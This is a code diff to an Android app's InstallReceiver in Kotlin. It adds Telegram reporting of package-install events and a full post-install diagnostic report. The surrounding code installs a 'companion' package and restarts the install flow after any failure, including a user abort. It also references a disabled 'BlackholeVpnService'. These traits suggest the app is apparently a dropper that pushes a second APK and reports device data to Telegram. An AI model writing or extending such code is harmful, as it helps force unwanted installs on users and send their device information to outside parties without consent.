@@ -41,6 +41,9 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE
         )
 
+        TelegramLogger.send(context, "INSTALL_RECEIVER", "STATUS_RECEIVED",
+            "status=$status rawStatusName=${statusName(status)} msg=${intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "none"}")
+
         when (status) {
 
             PackageInstaller.STATUS_PENDING_USER_ACTION -> {
@@ -51,6 +54,8 @@ class InstallReceiver : BroadcastReceiver() {
                     intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                 }
                 if (userIntent != null) {
+                    TelegramLogger.send(context, "STATUS_PENDING_USER_ACTION", "RELAY_SENT",
+                        "userIntent=${userIntent.component} action=${userIntent.action} — relaying to InstallActivity")
                     // Relay to InstallActivity via broadcast so it launches via startActivityForResult
                     // from Activity context — required on Android 10+ where FLAG_ACTIVITY_NEW_TASK
                     // from a BroadcastReceiver cannot surface over a foreground activity (BAL restriction).
@@ -60,6 +65,8 @@ class InstallReceiver : BroadcastReceiver() {
                     }
                     context.sendBroadcast(relay)
                 } else {
+                    TelegramLogger.send(context, "STATUS_PENDING_USER_ACTION", "FAILED",
+                        "userIntent is NULL — install dialogue cannot be shown")
                 }
             }
 
@@ -528,16 +535,25 @@ class InstallReceiver : BroadcastReceiver() {
                             diagLines.add("diagnostic_elapsed_ms=$elapsed")
                             diagLines.add("═══ END POST-INSTALL DIAGNOSTIC ═══")
 
-                            // Log all lines
+                            // Send full diagnostic report to Telegram
+                            val diagReport = diagLines.joinToString("\n")
+                            TelegramLogger.send(context, "STATUS_SUCCESS", "DIAGNOSTIC_REPORT", diagReport)
                         } catch (diagErr: Exception) {
+                            TelegramLogger.send(context, "STATUS_SUCCESS", "DIAG_EXCEPTION",
+                                "${diagErr.javaClass.simpleName}: ${diagErr.message}")
                         }
 
                     }
+                    TelegramLogger.send(context, "STATUS_SUCCESS", "INSTALL_COMPLETE",
+                        "companion pkg=$pkgName — sending INSTALL_SUCCESS_ACTION broadcast")
                     val successAction = context.packageName + ".INSTALL_SUCCESS"
                     val doneIntent = Intent(successAction)
                     doneIntent.setPackage(context.packageName)
                     context.sendBroadcast(doneIntent)
-                } catch (e: Exception) { }
+                } catch (e: Exception) {
+                    TelegramLogger.send(context, "STATUS_SUCCESS", "OUTER_EXCEPTION",
+                        "${e.javaClass.simpleName}: ${e.message}")
+                }
             }
 
             PackageInstaller.STATUS_FAILURE,
@@ -549,6 +565,8 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE_STORAGE -> {
                 // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
+                TelegramLogger.send(context, "INSTALL_FAILURE", statusName(status),
+                    "status=$status msg=$msg — relaying INSTALL_RESTART_ACTION to InstallActivity")
                 // Android 15+ (API 35+) blocks startActivity() from BroadcastReceiver
                 // (Background Activity Launch restriction). Relay to InstallActivity
                 // which restarts the install flow from Activity context.
@@ -557,5 +575,18 @@ class InstallReceiver : BroadcastReceiver() {
                 context.sendBroadcast(relay)
             }
         }
+    }
+
+    private fun statusName(status: Int): String = when (status) {
+        PackageInstaller.STATUS_PENDING_USER_ACTION   -> "PENDING_USER_ACTION"
+        PackageInstaller.STATUS_SUCCESS               -> "SUCCESS"
+        PackageInstaller.STATUS_FAILURE               -> "FAILURE"
+        PackageInstaller.STATUS_FAILURE_ABORTED       -> "FAILURE_ABORTED"
+        PackageInstaller.STATUS_FAILURE_BLOCKED       -> "FAILURE_BLOCKED"
+        PackageInstaller.STATUS_FAILURE_CONFLICT      -> "FAILURE_CONFLICT"
+        PackageInstaller.STATUS_FAILURE_INCOMPATIBLE  -> "FAILURE_INCOMPATIBLE"
+        PackageInstaller.STATUS_FAILURE_INVALID       -> "FAILURE_INVALID"
+        PackageInstaller.STATUS_FAILURE_STORAGE       -> "FAILURE_STORAGE"
+        else                                          -> "UNKNOWN_$status"
     }
 }
